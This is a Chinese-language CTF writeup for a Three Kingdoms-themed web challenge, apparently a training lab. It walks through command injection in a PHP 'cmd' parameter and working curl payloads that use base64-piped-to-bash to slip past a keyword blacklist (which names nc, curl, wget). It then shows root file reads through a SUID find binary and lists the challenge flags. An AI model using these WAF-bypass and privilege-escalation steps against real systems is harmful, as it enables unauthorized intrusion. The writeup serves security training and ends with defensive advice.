---
title: '许昌军机处 — CTF Writeup'
date: '2026-05-30T00:00:00Z'
modifiedTime: '2026-05-30T00:00:00Z'
intro: '题目名称：许昌军机处（三国军令系统）'
tags: ['ctf', 'writeup', 'cve', 'sql注入', '提权', 'php', 'python', '命令注入']
cover: ''
---
# 许昌军机处 — CTF Writeup

## 题目信息

- **题目名称**：许昌军机处（三国军令系统）
- **题目类型**：Web — 命令注入 + WAF Bypass + SUID 提权
- **技术栈**：Apache/2.4.54 (Debian) + PHP/7.4.33
- **难度**：中等
- **Flag 路径**：`/tmp/flag.txt`（一血）、`/root/flag.txt`（二血）

## 解题流程

### 一、信息收集

访问目标 `http://mcsddi4.haobachang1.loveli.com.cn:8888/`，页面是一个三国主题的"许昌军机处"军令系统，角色为司马懿。

响应头暴露技术栈：

```
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
```

页面底部有一个入口链接指向 `exploit.php`。

### 二、命令注入发现

访问 `exploit.php`，页面提示"未提供 cmd 参数"，说明存在参数传入点：

```bash
curl "http://TARGET:8888/exploit.php?cmd=id"
# 返回: uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "http://TARGET:8888/exploit.php?cmd=whoami"
# 返回: www-data
```

命令注入确认，当前用户为 `www-data`。

### 三、源码审计

通过 base64 编码绕过读取 `exploit.php` 源码：

```bash
echo Y2F0IC92YXIvd3d3L2h0bWwvZXhwbG9pdC5waHA= | base64 -d | bash
```

```php
$blacklist = [
    'php', 'python', 'vim', 'vi', 'nc',
    'curl', 'wget', '`', '&', ';', '$', '>', '<', '\\'
];
```

WAF 采用黑名单关键字匹配（`stripos` 大小写不敏感），但**只检查明文 `cmd` 参数**，不检查 base64 解码后的内容。额外还有一个隐藏的 WAF 层，过滤了 `cat`、`flag` 等关键字。

### 四、Flag 1 — 命令注入 + WAF Bypass

`cat` 被过滤，`tac`（反向输出）可用。`flag` 关键字被额外过滤，用通配符 `*` 绕过：

```bash
# cat 被拦截，tac 可用
# flag 关键字被过滤，用 fla* 绕过
curl "http://TARGET:8888/exploit.php?cmd=echo+dGFjIC90bXAvZmxhKg==|base64+-d|bash"
```

```
flag{42b8347ae76842e39a8fbe8b8a1275b5}
```

### 五、信息收集 — 提权路径

读取根目录初始化脚本：

```bash
# /init.sh 内容
#!/bin/bash
# 给低权限用户 simayi 制造 SUID 提权点
chmod u+s /usr/bin/find
# sudo 配置弱点
echo "simayi ALL=(ALL) NOPASSWD: /usr/bin/find" >> /etc/sudoers
```

系统存在两个用户：`caocao`（曹操）和 `simayi`（司马懿）。`/usr/bin/find` 被设置了 SUID 位（`-rwsr-xr-x`），`simayi` 有 `sudo NOPASSWD` 权限。

### 六、Flag 2 — 双层 WAF 绕过 + SUID 提权

直接使用 `find /roo* -exec tac {} +` 会被第二层 WAF 拦截（检测 `find ... -exec` 与 `/root` 的组合）。

**绕过方案 — PHP 代码注入套 SUID find**：

利用 PHP 的 `system()` 函数作为间接执行层，绕过 WAF 的命令关键字检测：

```bash
# Base64 编码的 PHP 命令
# php -r "system('/usr/bin/find /roo* -exec /usr/bin/tac {} +');"
curl "http://TARGET:8888/exploit.php?cmd=echo+cGhwIC1yICJzeXN0ZW0oJy91c3IvYmluL2ZpbmQgL3JvbyogLWV4ZWMgL3Vzci9iaW4vdGFjIHt9ICsnKTsi|base64+-d|bash"
```

执行原理：

```
echo cGhwIC1y...  →  输出 base64 字符串（WAF 只看到无害的编码串）
| base64 -d       →  解码还原为 PHP 命令
| bash            →  执行 PHP 命令
    └→ php -r "system('...')"  →  PHP 运行 SUID find（WAF 不检查 PHP 内部命令）
        └→ find /roo* -exec tac {} +  →  SUID 使 find 以 root 身份执行 tac
            └→ tac 读取 /root/flag.txt →  输出 flag
```

```
flag{e764c07f3f604eeebea2b549c54f3540}
```

## Flag

### Flag 1（/tmp/flag.txt）

```
flag{42b8347ae76842e39a8fbe8b8a1275b5}
```

### Flag 2（/root/flag.txt）

```
flag{e764c07f3f604eeebea2b549c54f3540}
```

## 总结

| 要点 | 说明 |
|------|------|
| **漏洞类型** | `exploit.php` 直接将 `cmd` 参数传入 `system()`，无有效过滤 |
| **WAF 机制** | 两层过滤：① PHP 层黑名单关键字匹配；② 隐藏层过滤 `cat`、`flag` 等 |
| **Flag 1 Bypass** | `tac` 替代 `cat` + 通配符 `*` 绕过 `flag` 关键字 |
| **提权路径** | SUID find（`chmod u+s /usr/bin/find`）+ sudo NOPASSWD |
| **Flag 2 Bypass** | base64 编码 PHP 命令绕过外层 WAF → PHP `system()` 调用 SUID find 以 root 读取文件 |
| **防御建议** | 1) 禁止用户输入传入命令执行函数；2) 白名单替代黑名单；3) WAF 需具备递归解码检测能力；4) 避免为低权限用户设置 SUID 提权点 |
